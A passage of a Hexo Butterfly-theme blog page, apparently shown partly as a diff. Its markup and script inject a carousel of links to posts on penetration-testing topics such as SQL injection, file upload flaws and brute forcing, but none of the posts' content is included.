onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/6f93ef5.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">信息收集篇文件和目录的扫描</a><div class="blog-slider__text">渗透测试信息收集\目录的扫描</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/6f93ef5.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/3b46b5f7.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/3b46b5f7.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">文件上传漏洞篇</a><div class="blog-slider__text">渗透测试文件上传</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/3b46b5f7.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/43cea1e2.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/3.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/43cea1e2.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">渗透测试中的常用编码</a><div class="blog-slider__text">渗透测试常用编码</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/43cea1e2.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/4eaf266d.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-03-07</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/4eaf266d.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">穷举篇</a><div class="blog-slider__text">渗透测试穷举</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/4eaf266d.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;post/db433311.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2.jpg" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-02-21</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;post/db433311.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">SQL注入篇</a><div class="blog-slider__text">渗透测试SQL注入学习</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;post/db433311.html&quot;);" href="javascript:void(0);" rel="external nofollow noreferrer" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
